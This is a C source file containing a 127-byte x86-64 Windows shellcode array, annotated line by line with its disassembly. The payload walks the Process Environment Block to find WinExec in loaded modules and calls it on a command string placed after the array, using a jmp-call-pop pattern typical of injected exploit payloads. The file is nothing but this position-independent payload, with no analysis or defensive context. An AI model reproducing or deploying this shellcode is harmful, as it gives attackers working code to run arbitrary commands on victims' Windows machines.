
// Target architecture : X86 64

#define EXEC_SIZE 127

char EXEC[] = {
  /* 0000 */ "\x56"                         /* push   rsi                               */
  /* 0001 */ "\x57"                         /* push   rdi                               */
  /* 0002 */ "\x53"                         /* push   rbx                               */
  /* 0003 */ "\x55"                         /* push   rbp                               */
  /* 0004 */ "\x48\x83\xec\x28"             /* sub    rsp, 0x28                         */
  /* 0008 */ "\xeb\x70"                     /* jmp    0x7a                              */
  /* 000A */ "\x41\x5a"                     /* pop    r10                               */
  /* 000C */ "\x6a\x60"                     /* push   0x60                              */
  /* 000E */ "\x41\x5b"                     /* pop    r11                               */
  /* 0010 */ "\x65\x49\x8b\x03"             /* mov    rax, qword ptr gs:[r11]           */
  /* 0014 */ "\x48\x8b\x40\x18"             /* mov    rax, qword ptr [rax + 0x18]       */
  /* 0018 */ "\x48\x8b\x78\x10"             /* mov    rdi, qword ptr [rax + 0x10]       */
  /* 001C */ "\xeb\x03"                     /* jmp    0x21                              */
  /* 001E */ "\x48\x8b\x3f"                 /* mov    rdi, qword ptr [rdi]              */
  /* 0021 */ "\x48\x8b\x5f\x30"             /* mov    rbx, qword ptr [rdi + 0x30]       */
  /* 0025 */ "\x48\x85\xdb"                 /* test   rbx, rbx                          */
  /* 0028 */ "\x74\x47"                     /* je     0x71                              */
  /* 002A */ "\x8b\x43\x3c"                 /* mov    eax, dword ptr [rbx + 0x3c]       */
  /* 002D */ "\x44\x01\xd8"                 /* add    eax, r11d                         */
  /* 0030 */ "\x8b\x4c\x03\x28"             /* mov    ecx, dword ptr [rbx + rax + 0x28] */
  /* 0034 */ "\x67\xe3\xe7"                 /* jecxz  0x1e                              */
  /* 0037 */ "\x48\x8d\x74\x0b\x18"         /* lea    rsi, qword ptr [rbx + rcx + 0x18] */
  /* 003C */ "\xad"                         /* lodsd  eax, dword ptr [rsi]              */
  /* 003D */ "\x91"                         /* xchg   eax, ecx                          */
  /* 003E */ "\x67\xe3\xdd"                 /* jecxz  0x1e                              */
  /* 0041 */ "\xad"                         /* lodsd  eax, dword ptr [rsi]              */
  /* 0042 */ "\x92"                         /* xchg   eax, edx                          */
  /* 0043 */ "\x48\x01\xda"                 /* add    rdx, rbx                          */
  /* 0046 */ "\xad"                         /* lodsd  eax, dword ptr [rsi]              */
  /* 0047 */ "\x95"                         /* xchg   eax, ebp                          */
  /* 0048 */ "\x48\x01\xdd"                 /* add    rbp, rbx                          */
  /* 004B */ "\xad"                         /* lodsd  eax, dword ptr [rsi]              */
  /* 004C */ "\x96"                         /* xchg   eax, esi                          */
  /* 004D */ "\x48\x01\xde"                 /* add    rsi, rbx                          */
  /* 0050 */ "\x8b\x44\x8d\xfc"             /* mov    eax, dword ptr [rbp + rcx*4 - 4]  */
  /* 0054 */ "\x81\x3c\x18\x57\x69\x6e\x45" /* cmp    dword ptr [rax + rbx], 0x456e6957 */
  /* 005B */ "\xe0\xf3"                     /* loopne 0x50                              */
  /* 005D */ "\x75\xbf"                     /* jne    0x1e                              */
  /* 005F */ "\x0f\xb7\x04\x4e"             /* movzx  eax, word ptr [rsi + rcx*2]       */
  /* 0063 */ "\x8b\x0c\x82"                 /* mov    ecx, dword ptr [rdx + rax*4]      */
  /* 0066 */ "\x48\x01\xcb"                 /* add    rbx, rcx                          */
  /* 0069 */ "\x41\x52"                     /* push   r10                               */
  /* 006B */ "\x59"                         /* pop    rcx                               */
  /* 006C */ "\x6a\x01"                     /* push   1                                 */
  /* 006E */ "\x5a"                         /* pop    rdx                               */
  /* 006F */ "\xff\xd3"                     /* call   rbx                               */
  /* 0071 */ "\x48\x83\xc4\x28"             /* add    rsp, 0x28                         */
  /* 0075 */ "\x5d"                         /* pop    rbp                               */
  /* 0076 */ "\x5b"                         /* pop    rbx                               */
  /* 0077 */ "\x5f"                         /* pop    rdi                               */
  /* 0078 */ "\x5e"                         /* pop    rsi                               */
  /* 0079 */ "\xc3"                         /* ret                                      */
  /* 007A */ "\xe8\x8b\xff\xff\xff"         /* call   0xa                               */
};
